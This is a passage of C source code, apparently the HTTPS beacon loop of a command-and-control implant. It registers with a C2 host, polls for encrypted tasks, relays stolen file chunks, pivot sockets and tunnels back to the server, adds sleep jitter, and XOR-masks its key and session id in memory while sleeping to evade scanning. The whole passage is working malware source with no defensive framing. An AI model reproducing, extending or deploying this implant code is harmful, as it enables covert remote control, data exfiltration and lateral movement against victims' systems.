            uint32_t resp_len = 0;
            DBG_SEC("REGISTER");
            DBG("sending REGISTER to %s", g_cur_host[0] ? g_cur_host : a->cfg.c2_host);
            uint8_t *resp = https_post(a, enc, enc_len, 0 /*pre-profile*/, &resp_len);
            free(enc);

            if (!resp || resp_len == 0) {
                DBG_ERR("REGISTER failed — no response");
                if (resp) free(resp);
                sleep(3);
                https_rotate_host(a);
                continue;
            }
            DBG("REGISTER response: %u bytes", resp_len);

            /* Decrypt PROFILE response (raw AES-CBC, no ServerOutput decode) */
            uint8_t *plain = (uint8_t *)malloc(resp_len + NAX_AES_BLOCK);
            if (!plain) { free(resp); sleep(3); continue; }
            uint32_t plain_len = resp_len + NAX_AES_BLOCK;
            if (nax_decrypt(a->cfg.aes_key, resp, resp_len, plain, &plain_len) < 0) {
                free(resp); free(plain); sleep(3); continue;
            }
            free(resp);

            uint8_t ft = 0; uint8_t *fb = NULL; uint32_t fbl = 0;
            if (nax_frame_decode(plain, plain_len, &ft, &fb, &fbl) < 0) {
                free(plain); sleep(3); continue;
            }

            if (ft == NAX_WIRE_PROFILE) {
                DBG_OK("REGISTER: got PROFILE (%u bytes)", fbl);
                nax_apply_profile(fb, fbl);
                extern void nax_dbg_print_profile_pub(void);
                nax_dbg_print_profile_pub();
                registered = 1;
                DBG_OK("REGISTERED — entering heartbeat loop");
            } else {
                DBG_ERR("REGISTER: unexpected frame type=0x%02x", ft);
            }
            free(plain);
        }
        if (!a->running) break;

        /* ── Heartbeat loop ── */
        while (a->running) {
            https_rotate_host(a);

            /* GET — encrypted heartbeat */
            uint8_t hb_frame[256]; uint32_t hb_frame_len = sizeof(hb_frame);
            if (nax_build_heartbeat(hb_frame, &hb_frame_len) < 0) continue;

            uint32_t hb_enc_cap = hb_frame_len + NAX_AES_IV + NAX_AES_BLOCK + 32;
            uint8_t *hb_enc = (uint8_t *)malloc(hb_enc_cap);
            if (!hb_enc) continue;
            uint32_t hb_enc_len = hb_enc_cap;
            if (nax_encrypt(a->cfg.aes_key, hb_frame, hb_frame_len,
                            hb_enc, &hb_enc_len) < 0) { free(hb_enc); continue; }

            uint32_t resp_len = 0;
            DBG_SEC("HEARTBEAT");
            uint8_t *resp = https_get(a, hb_enc, hb_enc_len, &resp_len);
            DBG("→ GET %s (host=%s sleep=%ums jitter=%u%%)",
                nax_profile_get_uri(),
                g_cur_host[0] ? g_cur_host : a->cfg.c2_host,
                a->cfg.sleep_ms, a->cfg.jitter_pct);
            free(hb_enc);

            if (!resp) {
                if (resp_len == 0) {
                    DBG("GET: EmptyResp — no tasks");
                } else {
                    DBG_ERR("GET failed (resp_len=%u)", resp_len);
                }
            } else {
                DBG_OK("GET: %u bytes — processing", resp_len);
            }

            int had_tasks = 0;
            if (resp && resp_len > 0)
                had_tasks = https_handle_frames(a, resp, resp_len);
            if (resp) free(resp);

            /* Check pending pivot data */
            int has_pivot_data = 0;
            if (a->pivot_head) {
                NaxPivot *p = a->pivot_head;
                while (p && !has_pivot_data) {
                    struct pollfd pfd = { .fd = p->sock, .events = POLLIN };
                    if (poll(&pfd, 1, 0) > 0 && (pfd.revents & POLLIN))
                        has_pivot_data = 1;
                    p = p->next;
                }
            }

            if (has_pivot_data)
                process_pivots(a);

            nax_opsec_heartbeat();

            /* Relay download chunks (one chunk per active download per cycle) */
            if (a->download_head) {
                uint32_t cap = NAX_DL_CHUNK_MAX + 64;
                uint8_t *dbuf = (uint8_t *)malloc(cap);
                if (dbuf) {
                    uint32_t total = nax_process_downloads(a, dbuf, cap);
                    /* Parse packed entries: [taskId(4)][dataLen(4)][data] */
                    uint32_t off = 0;
                    while (off + 8 <= total) {
                        uint32_t tid  = (uint32_t)dbuf[off]   | ((uint32_t)dbuf[off+1]<<8)
                                      | ((uint32_t)dbuf[off+2]<<16) | ((uint32_t)dbuf[off+3]<<24);
                        uint32_t dlen = (uint32_t)dbuf[off+4] | ((uint32_t)dbuf[off+5]<<8)
                                      | ((uint32_t)dbuf[off+6]<<16) | ((uint32_t)dbuf[off+7]<<24);
                        off += 8;
                        if (off + dlen > total) break;
                        https_send_result(a, tid, NAX_STATUS_OK, dbuf + off, dlen);
                        off += dlen;
                    }
                    free(dbuf);
                }
            }

            /* Relay tunnels */
            {
                uint8_t *tbuf = (uint8_t *)malloc(4 * 1024 * 1024);
                if (tbuf) {
                    uint32_t tl = nax_process_tunnels_ex(a, tbuf, 4 * 1024 * 1024);
                    if (tl > 0) https_send_result(a, 0, NAX_STATUS_TUNNEL, tbuf, tl);
                    free(tbuf);
                }
            }

            nax_https_drain_async(a);

            if (had_tasks || has_pivot_data) continue;

            /* Apply pending profile */
            if (nax_profile_apply_pending())
                DBG("pending profile applied");

            /* Profile burst: skip sleep */
            if (a->cfg.profile_burst_until > 0 &&
                time(NULL) < a->cfg.profile_burst_until) continue;
            a->cfg.profile_burst_until = 0;

            /* ── Sleep with obfuscation (memfd key, same as original) ── */
            {
                uint32_t ms = a->cfg.sleep_ms;
                if (a->cfg.jitter_pct > 0 && ms > 0) {
                    uint8_t r = 0;
                    FILE *rf = fopen("/dev/urandom", "rb");
                    if (rf) { fread(&r, 1, 1, rf); fclose(rf); }
                    uint32_t delta = (ms * a->cfg.jitter_pct / 100) * r / 255;
                    ms = (r & 1) ? ms + delta : (ms > delta ? ms - delta : 0);
                }

                if (ms > 0) {
                    DBG("sleeping %u ms (configured=%u jitter=%u%%)",
                        ms, a->cfg.sleep_ms, a->cfg.jitter_pct);

                    #define NAX_OBF_KEY_LEN 64u
                    uint8_t obf_key[NAX_OBF_KEY_LEN];
                    int key_fd = -1;

                    FILE *uf = fopen("/dev/urandom", "rb");
                    if (uf) {
                        fread(obf_key, 1, NAX_OBF_KEY_LEN, uf);
                        fclose(uf);

                        key_fd = memfd_create(".", MFD_CLOEXEC);
                        if (key_fd >= 0)
                            write(key_fd, obf_key, NAX_OBF_KEY_LEN);

                        volatile uint8_t *kp = (volatile uint8_t *)a->cfg.aes_key;
                        for (uint32_t i = 0; i < NAX_AES_KEY_SIZE; i++)
                            kp[i] ^= obf_key[i % NAX_OBF_KEY_LEN];

                        volatile char *sp = (volatile char *)a->session_id;
                        for (uint32_t i = 0; i <= NAX_SID_LEN; i++)
                            ((volatile uint8_t *)sp)[i] ^=
                                obf_key[(NAX_AES_KEY_SIZE + i) % NAX_OBF_KEY_LEN];

                        nax_profile_xor(obf_key, NAX_OBF_KEY_LEN);

                        volatile uint8_t *zp = (volatile uint8_t *)obf_key;
                        for (uint32_t i = 0; i < NAX_OBF_KEY_LEN; i++) zp[i] = 0;
                    }

                    struct timespec ts = { ms / 1000, (long)(ms % 1000) * 1000000L };
                    nanosleep(&ts, NULL);

                    if (key_fd >= 0) {
                        uint8_t restore_key[NAX_OBF_KEY_LEN];
                        lseek(key_fd, 0, SEEK_SET);
                        read(key_fd, restore_key, NAX_OBF_KEY_LEN);
                        close(key_fd);

                        volatile uint8_t *kp = (volatile uint8_t *)a->cfg.aes_key;
                        for (uint32_t i = 0; i < NAX_AES_KEY_SIZE; i++)
                            kp[i] ^= restore_key[i % NAX_OBF_KEY_LEN];

                        volatile char *sp = (volatile char *)a->session_id;
                        for (uint32_t i = 0; i <= NAX_SID_LEN; i++)
                            ((volatile uint8_t *)sp)[i] ^=
                                restore_key[(NAX_AES_KEY_SIZE + i) % NAX_OBF_KEY_LEN];

                        nax_profile_xor(restore_key, NAX_OBF_KEY_LEN);

                        volatile uint8_t *zp = (volatile uint8_t *)restore_key;
                        for (uint32_t i = 0; i < NAX_OBF_KEY_LEN; i++) zp[i] = 0;
                    }
                    DBG("sleep done");
                }
            }
        }
    }

    curl_global_cleanup();
}

#endif /* NAX_HTTPS_MODE */
